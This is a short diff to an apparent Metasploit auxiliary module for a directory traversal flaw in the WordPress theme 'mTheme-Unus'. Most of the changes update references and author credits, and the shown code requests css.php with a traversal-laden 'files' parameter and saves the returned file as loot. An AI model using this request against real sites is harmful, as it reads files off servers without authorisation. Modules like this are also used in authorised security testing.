@@ -21,11 +21,12 @@ class Metasploit3 < Msf::Auxiliary
       },
       'References'     =>
         [
-          ['EDB', '77777']
+          ['EDB', '36733'],
+          ['WPVDB', '7898']
         ],
       'Author'         =>
         [
-          'TO DO', # Vulnerability discovery
+          'Khwanchai Kaewyos', # Vulnerability discovery
           'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module
         ],
       'License'        => MSF_LICENSE
@@ -47,8 +48,7 @@ class Metasploit3 < Msf::Auxiliary
 
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => normalize_uri(datastore['TARGETURI'], 'wp-content', 'themes', 'mTheme-Unus',
-                                'css', 'css.php'),
+      'uri'    => normalize_uri(datastore['TARGETURI'], 'wp-content', 'themes', 'mTheme-Unus', 'css', 'css.php'),
       'vars_get' =>
         {
           'files' => "#{traversal}#{filename}"
@@ -65,7 +65,7 @@ class Metasploit3 < Msf::Auxiliary
       fname = datastore['FILEPATH']
 
       path = store_loot(
-        'rips.traversal',
+        'mobileedition.traversal',
         'text/plain',
         ip,
         res.body,
